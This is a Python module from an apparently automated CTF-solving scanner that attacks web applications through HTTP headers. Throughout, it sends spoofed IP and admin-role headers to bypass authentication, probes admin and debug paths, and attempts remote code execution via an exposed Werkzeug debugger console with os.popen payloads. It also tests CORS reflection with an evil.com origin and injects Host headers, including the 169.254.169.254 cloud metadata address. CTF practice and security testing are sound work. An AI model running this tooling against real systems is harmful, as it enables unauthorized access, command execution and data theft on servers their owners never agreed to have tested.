"""
Headers Module — Host injection, debug consoles, X-Forwarded bypass, CORS misconfig.
Extremely common in CTF challenges for auth bypass and admin access.
"""
import re
from backend.core.base_module import BaseModule
from backend.core.flag_hunter import FlagHunter
from backend.core.parser import Parser


class HeadersModule(BaseModule):
    MODULE_NAME = "headers"
    DESCRIPTION = "Host Injection / Header Auth Bypass / Debug Console"

    # Auth bypass headers
    BYPASS_HEADERS_SETS = [
        {"X-Forwarded-For": "127.0.0.1"},
        {"X-Real-IP": "127.0.0.1"},
        {"X-Originating-IP": "127.0.0.1"},
        {"X-Remote-IP": "127.0.0.1"},
        {"X-Client-IP": "127.0.0.1"},
        {"X-Forwarded-For": "127.0.0.1", "X-Real-IP": "127.0.0.1"},
        {"Client-IP": "127.0.0.1"},
        {"True-Client-IP": "127.0.0.1"},
        {"CF-Connecting-IP": "127.0.0.1"},
        # Role/admin bypass
        {"X-Admin": "true"},
        {"X-Admin": "1"},
        {"X-Role": "admin"},
        {"X-User-Role": "admin"},
        {"X-Is-Admin": "true"},
        {"X-Is-Admin": "1"},
        {"X-Privilege": "admin"},
        {"X-Auth-Token": "admin"},
        {"X-Auth": "admin"},
        {"X-Access": "admin"},
        {"Admin": "true"},
        # CTF-specific common bypasses
        {"X-Flag": "true"},
        {"X-Secret": "true"},
        {"X-Debug": "true"},
        {"X-Internal": "true"},
        {"X-Override": "admin"},
        {"X-Custom-IP-Authorization": "127.0.0.1"},
        # User agent tricks
    ]

    DEBUG_PATHS = [
        "/__debug__", "/console", "/_debug", "/debugger",
        "/werkzeug", "/__profiler__", "/_profiler",
        "/?__debugger__=yes", "/?debugger=1",
    ]

    ADMIN_PATHS = [
        "/admin", "/admin/", "/admin/flag", "/admin/dashboard",
        "/admin/console", "/admin/panel", "/admin/debug",
        "/superuser", "/root", "/internal",
        "/api/admin", "/api/internal", "/api/secret",
    ]

    def run(self) -> dict:
        self.log(f"[HEADERS] Starting scan on {self.target_url}")

        from urllib.parse import urlparse
        parsed = urlparse(self.target_url)
        base   = f"{parsed.scheme}://{parsed.netloc}"

        # 1. Base response
        resp = self.requester.get()
        if resp is None:
            self.results["status"] = "unreachable"
            return self.results
        for f in FlagHunter.hunt(resp.text):
            self.add_flag(f)

        # 2. Try header-bypass on all interesting paths
        for path in self.ADMIN_PATHS + [self.target_url]:
            url = base + path if path.startswith("/") else path
            self._try_header_bypass(url)

        # 3. Try debug console detection
        self._check_debug(base)

        # 4. Check CORS misconfig / leaked data in CORS preflight
        self._check_cors(base)

        # 5. Host header injection
        self._test_host_injection()

        if self.results["status"] == "pending":
            self.results["status"] = "not_vulnerable"
        return self.results

    def _try_header_bypass(self, url):
        for hset in self.BYPASS_HEADERS_SETS:
            r = self.requester.raw_get(url, headers=hset)
            if r is None or r.status_code == 404:
                continue
            flags = FlagHunter.hunt(r.text)
            if flags:
                for f in flags:
                    self.add_flag(f)
                self.add_vuln({"type": "header_bypass_flag", "url": url,
                               "headers": hset, "flags": flags})
                self.log(f"[HEADERS] 🚩 FLAG via bypass headers on {url}: {flags}")
                return
            if r.status_code in (200, 201):
                # Check all response headers for flags
                for hval in r.headers.values():
                    ff = FlagHunter.hunt(hval)
                    if ff:
                        [self.add_flag(f) for f in ff]
                        self.add_vuln({"type": "header_bypass_response",
                                       "url": url, "headers": hset})
                        self.log(f"[HEADERS] Bypassed! {url} with {hset}")

    def _check_debug(self, base):
        for path in self.DEBUG_PATHS:
            url = base + path
            r = self.requester.raw_get(url)
            if r is None:
                continue
            if r.status_code == 200:
                flags = FlagHunter.hunt(r.text)
                [self.add_flag(f) for f in flags]
                # Werkzeug debug console detection
                if "Werkzeug" in r.text or "debugger" in r.text.lower():
                    self.add_vuln({"type": "debug_console_exposed", "url": url})
                    self.log(f"[HEADERS] ⚠️ Debug console at {url}! Attempting RCE...")
                    self._exploit_werkzeug(url, base)

    def _exploit_werkzeug(self, debug_url, base):
        """Attempt to use Werkzeug interactive debugger for RCE."""
        import re
        r = self.requester.raw_get(debug_url)
        if r is None:
            return
        # Extract PIN if shown
        pin_match = re.search(r"PIN[:\s]+(\d{3}-\d{3}-\d{3}|\d{9})", r.text)
        if pin_match:
            self.log(f"[HEADERS] Werkzeug PIN: {pin_match.group(1)}")
        # Try the console endpoint directly
        console_url = base + "/__debugger__/console"
        cmd_payloads = [
            "import os; os.popen('cat /flag.txt').read()",
            "import os; os.popen('cat /flag').read()",
            "open('/flag.txt').read()",
        ]
        for cmd in cmd_payloads:
            r2 = self.requester.post(console_url, data={"cmd": cmd, "frm": "0", "s": ""})
            if r2:
                flags = FlagHunter.hunt(r2.text)
                [self.add_flag(f) for f in flags]

    def _check_cors(self, base):
        """Look for CORS misconfig that exposes sensitive data."""
        r = self.requester.raw_get(
            self.target_url,
            headers={"Origin": "http://evil.com"}
        )
        if r is None:
            return
        acao = r.headers.get("Access-Control-Allow-Origin", "")
        acac = r.headers.get("Access-Control-Allow-Credentials", "")
        if acao in ("*", "http://evil.com") and acac.lower() == "true":
            self.add_vuln({"type": "cors_misconfiguration",
                           "origin_reflected": acao, "credentials": acac})
            self.log(f"[HEADERS] CORS misconfiguration: {acao}, credentials: {acac}")
        flags = FlagHunter.hunt(r.text)
        [self.add_flag(f) for f in flags]

    def _test_host_injection(self):
        """Host header injection for SSRF/cache-poisoning style flag exposure."""
        payloads = [
            "localhost", "127.0.0.1", "169.254.169.254",
            "internal", "admin.internal",
        ]
        for host in payloads:
            r = self.requester.raw_get(self.target_url, headers={"Host": host})
            if r is None:
                continue
            flags = FlagHunter.hunt(r.text)
            if flags:
                [self.add_flag(f) for f in flags]
                self.add_vuln({"type": "host_injection_flag", "host": host, "flags": flags})
                self.log(f"[HEADERS] FLAG via Host: {host}")
